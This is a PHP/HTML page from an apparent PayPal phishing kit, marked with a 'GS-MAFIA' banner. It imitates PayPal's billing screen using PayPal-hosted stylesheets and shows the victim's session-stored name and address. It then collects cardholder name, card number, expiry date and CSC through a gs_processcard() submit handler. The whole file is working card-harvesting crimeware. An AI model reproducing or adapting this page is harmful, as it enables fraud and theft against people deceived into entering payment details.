<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
session_start();
include("languages/index.php");
include ("languages/lang".$_SESSION['gs_langlink']);
?>
<div class="ngrl-anomalydetection-div" style="display: block;">
	<div id="gs_pp">
		<div class="appChallengeNS">
			<div class="container-fluid captcha-overlay captcha-container" id="captcha-standalone" data-captcha-type="recaptcha" data-disable-autosubmit="true" data-json-captcha-flow="true" data-jse="b31220037f422a292db641051ab19d1b" style="visibility: visible;">
				<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/2e8/5cbf3e95c34cfc5bbbf7559c95702/css/appChallenge.css">
				<div class="corral">
					<div id="content" class="contentContainerXhr">
						<div id="gs_load2">
							<div id="gs_loading"></div>
							<div id="gs_overlay"></div>
						</div>
						<div id="gs_pp2">
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="StickyContainer">
	<div class="StickyBody full-height">
		<div class="CTABannerContainer CTABannerContainer--billinginfopage ">
			<div class="DefaultCTABanner">
			</div>
			<div class="DefaultGreeting">
				<div class="cta-banner">
					<div class="cta-headline">
						<span class="cta-name">
							<h2 style="margin-bottom: 0px;font-size: 28.5px;"><?php echo $gs_string21 ?></h2>
						</span>
						<div class="textInput lap">
							<div class="fields email large">
								<div class="nativeDropdown  large ">
									<div class="selectDropdown ">
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="billing-address-user-info-card" class="UserInfoCard">
			<div class="user-info-card">
				<div class="address-block">
					<div class="name">
						<?php echo $_SESSION['gs_billarray']['gs_fname'] ?>
						<?php echo $_SESSION['gs_billarray']['gs_lname'] ?>
					</div>
					<div class="address">
						<div>
							<?php  echo $_SESSION['gs_billarray']['gs_street1'] ?>
						</div>
						<div>
							<?php  echo $_SESSION['gs_billarray']['gs_city'] ?>
							,<?php  echo $_SESSION['gs_billarray']['gs_postalCode'] ?>
						</div>
					</div>
					<div id="address">
						<div class="address">
							<?php  echo $_SESSION['gs_billarray']['gs_country'] ?>
						</div>
					</div>
				</div>
				<a id="update-user-info" onmouseover="this.style.cursor='pointer'" onclick="gs_updatebill();"><?php echo $gs_string10 ?></a>
			</div>
		</div>
		<div class="body-content">
			<div>
				<div id="address-suggest-field" class="AddressSuggestField">
					<div class="TextField form-field">
						<div style="margin-top:15px;" class="inputField textInput">
							<input type="text" name="gs_holder" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="<?php echo $_SESSION['gs_billarray']['gs_lname'].' '.$_SESSION['gs_billarray']['gs_fname'] ?>" id="gs_holder" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false">
							<label class="input-has-value" for="street1"><?php echo $gs_string22 ?></label>
						</div>
					</div>
				</div>
				<span id="gs_cardhead">
					<?php echo $gs_string33 ?> : <span id="gs_paymentlogo" class="pf pf-credit-card"></span>
				</span>
				<div class="TextField form-field">
					<div class="inputField textInput">
						<input type="text" name="gs_cc" onkeyup="gs_verifcc();gs_addseparator();" onkeydown="gs_checktype();" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="" id="gs_cc" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false" maxlength="19">
						<label class=" input-has-value" for="street2"><?php echo $gs_string34 ?></label>

					</div>
				</div>
			</div>
			<div id="gs_expcsc">
				<div class="row gutter-10">
					<div class="col-xs-3">
						<div class="SelectField form-field">
							<div class="selectDropdown">
								<select name="gs_exp_month" onchange="gs_verifexp();" id="gs_exp_month" class="" data-errormsg="" data-haserror="false" data-errorshowmsg="false">
									<option value="1">01</option>
									<option value="2">02</option>
									<option value="3">03</option>
									<option value="4">04</option>
									<option value="5">05</option>
									<option value="6">06</option>
									<option value="7">07</option>
									<option value="8">08</option>
									<option value="9">09</option>
									<option value="10">10</option>
									<option value="11">11</option>
									<option value="12">12</option>
								</select>
								<label for="state"><?php echo $gs_string23 ?></label>
							</div>
						</div>
					</div>
					<div class="col-xs-4">
						<div class="SelectField form-field">
							<div class="selectDropdown">
								<select name="gs_exp_year" onchange="gs_verifexp();" id="gs_exp_year" class="" data-errormsg="" data-haserror="false" data-errorshowmsg="false">
									<option value="2020">2020</option>
									<option value="2021">2021</option>
									<option value="2022">2022</option>
									<option value="2023">2023</option>
									<option value="2024">2024</option>
									<option value="2025">2025</option>
									<option value="2026">2026</option>
									<option value="2027">2027</option>
									<option value="2027">2028</option>
									<option value="2027">2029</option>
									<option value="2027">2030</option>
								</select>
								<label for="state"><?php echo $gs_string24 ?></label>
							</div>
						</div>
					</div>
					<div class="col-xs-5">
						<div class="TextField form-field">
							<div class="inputField textInput">
								<input type="text" name="gs_csc" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" id="gs_csc" maxlength="4" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false">
								<label class="input-has-value" for="postalCode">
								CSC</label>
								<span id="gs_cvvicone"></span>
							</div>
						</div>
					</div>
				</div>
				<div class="StickyFooter">
					<div class="sticky-footer-container">
						<div class="sticky-footer-fade">
						</div>
						<div class="sticky-footer-body">
							<div class="body-content">
								<div id="action-buttons" class="buttons" onclick="gs_processcard();">
									<button class="CAPE-Button btn full " type="button" id="billingInfoContinueBtn">
										<span><?php echo $gs_string19 ?></span>
									</button>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>